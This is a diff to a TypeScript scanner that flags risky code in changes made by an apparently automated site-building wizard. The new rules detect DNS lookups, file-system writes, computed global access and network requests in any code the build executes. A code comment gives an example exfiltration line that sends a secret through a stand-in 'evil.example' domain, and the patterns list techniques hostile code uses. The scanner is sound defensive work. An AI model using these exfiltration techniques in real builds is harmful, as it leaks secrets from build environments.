@@ -59,8 +59,10 @@ export const TURN_GATE_RULES = {
   worker_threads: "starts a worker thread",
   http_request: "makes an HTTP request with node:http(s)",
   node_internals: "reaches Node internals (vm, module, process.binding)",
-  build_time_fetch: "makes a network request from a build-time file",
-  computed_global: "reaches a global by a computed name in a build-time file",
+  build_time_fetch: "makes a network request from code the build runs",
+  computed_global: "reaches a global by a computed name in code the build runs",
+  dns: "resolves names with node:dns (a DNS exfiltration channel)",
+  fs_write: "writes the file system from code the build runs",
   eval: "calls eval",
   new_function: "builds code with Function(",
   computed_require: "loads a computed module path (require / import / createRequire)",
@@ -97,6 +99,25 @@ const SCRIPTS_DIR = /(?:^|\/)scripts\//
 /** A `scripts/` folder under one of these is shipped page code (`public/scripts/widget.js`), not a build step. */
 const PAGE_CODE_DIR = /(?:^|\/)(?:public|static|assets|src|app|pages|components|lib)\//
 
+/** Files the build never executes: markup, styles, data and assets. */
+const NOT_EXECUTED = /\.(?:html?|css|scss|sass|less|md|json|svg|txt|ya?ml|png|jpe?g|gif|webp|ico|woff2?)$/i
+const PUBLIC_DIR = /(?:^|\/)(?:public|static)\//
+const CODE_FILE = /\.(?:[cm]?[jt]sx?|astro|vue|svelte|mdx)$/i
+/** A `"use client"` directive as the file's first statement (comments before it allowed). */
+const CLIENT_DIRECTIVE = /^\s*(?:(?:\/\/[^\n]*\n|\/\*[\s\S]*?\*\/)\s*)*["']use client["']/
+
+/**
+ * Review I1 P1-3: code the wizard's own build EXECUTES (network on, `.env` loaded): every build-time file, and
+ * every code file outside `public/`/`static/` that is not a `"use client"` module (server components, route
+ * handlers, server actions and the modules they import are rendered or bundled by the build, and prerender
+ * runs them). An unreadable file counts as executed (fail closed).
+ */
+export function isServerExecutedFile(path: string, full: string | null): boolean {
+  if (isBuildTimeFile(path)) return true
+  if (PUBLIC_DIR.test(path) || NOT_EXECUTED.test(path) || !CODE_FILE.test(path)) return false
+  return full === null || !CLIENT_DIRECTIVE.test(full)
+}
+
 /** `next.config.*`, `vite.config.*`, `vercel.json`, `middleware.*`, `postcss/tailwind.config.*`, a repo or app `scripts/**`. */
 export function isBuildTimeFile(path: string): boolean {
   if (BUILD_TIME_FILE.test(path)) return true
@@ -124,11 +145,21 @@ const LINE_RULES: ReadonlyArray<{ rule: TurnGateRule; pattern: RegExp; buildTime
   { rule: "node_internals", pattern: /\bprocess\s*\.\s*(?:binding|_linkedBinding|dlopen|mainModule)\b|\bmodule\s*\.\s*(?:require|constructor)\b/ },
   // B19: `process.getBuiltinModule("child_process")` loads any Node module without an import or require.
   { rule: "node_internals", pattern: /\bgetBuiltinModule\s*\(/ },
-  // Build-time files: any request that is not a relative-path literal (a variable URL is the exfil path).
+  // B: name resolution is a channel of its own (`dns.resolve(secret + ".evil.example")`), in any file.
+  { rule: "dns", pattern: moduleLoad("dns|dns/promises") },
+  // Code the build runs (review I1 P1-3; build-time files and every server-executed module): any request that is
+  // not a relative-path literal (a variable URL is the exfil path), the file system, and globals reached by name.
   { rule: "build_time_fetch", pattern: new RegExp(String.raw`(?<![\w$])fetch(?![\w$])(?!\s*\(\s*${RELATIVE_ARG})`), buildTimeOnly: true },
   { rule: "build_time_fetch", pattern: /\baxios\b|\bXMLHttpRequest\b|\bWebSocket\b|\bEventSource\b|\bsendBeacon\b/, buildTimeOnly: true },
   { rule: "build_time_fetch", pattern: moduleLoad("undici|node-fetch|cross-fetch|isomorphic-fetch|got|ky|ws"), buildTimeOnly: true },
   { rule: "computed_global", pattern: /(?<![\w$])(?:globalThis|global|self|window)\s*(?:\?\.\s*)?\[/, buildTimeOnly: true },
+  { rule: "computed_global", pattern: /\bReflect\s*\.\s*(?:get|apply|construct|getOwnPropertyDescriptor|ownKeys)\s*\(|\bObject\s*\.\s*getOwnPropertyDescriptors?\s*\(\s*(?:globalThis|global|self|window)\b/, buildTimeOnly: true },
+  { rule: "fs_write", pattern: moduleLoad("fs|fs/promises"), buildTimeOnly: true },
+  {
+    rule: "fs_write",
+    pattern: /\b(?:writeFile|writeFileSync|appendFile|appendFileSync|createWriteStream|copyFile|copyFileSync|cpSync|symlink|symlinkSync|link|linkSync|chmod|chmodSync|rename|renameSync|unlink|unlinkSync|rmSync|rmdirSync|mkdirSync|truncateSync|utimesSync)\s*\(/,
+    buildTimeOnly: true
+  },
   { rule: "eval", pattern: /(?<![\w$])eval(?![\w$])(?!\s*:)/ },
   { rule: "new_function", pattern: /(?<![\w$])Function\s*\(|\.\s*constructor\s*\(|\[\s*["'`]constructor["'`]\s*\]/ },
   { rule: "computed_require", pattern: new RegExp(String.raw`(?<![\w$.])(?:require|import)\s*\(\s*(?!${PLAIN_ARG}|$)`) },
@@ -276,8 +307,9 @@ export function scanTurnDiff(diff: TurnDiff, options: TurnGateOptions): TurnGate
     if (!hits.some((other) => other.rule === hit.rule && other.file === hit.file && other.line === hit.line)) hits.push(hit)
   }
   for (const file of diff.files) {
-    const buildTime = isBuildTimeFile(file.path)
     const full = file.added.length > 0 ? (options.readFile?.(file.path) ?? null) : null
+    // "Build-time only" rules apply to every file the build EXECUTES (review I1 P1-3), not only to configs.
+    const buildTime = isServerExecutedFile(file.path, full)
     const masked = maskedAddedLines(file.path, file.added, full)
     const byLine = new Map(file.added.map((entry) => [entry.line, entry.text]))
     for (const { line, text } of file.added) {
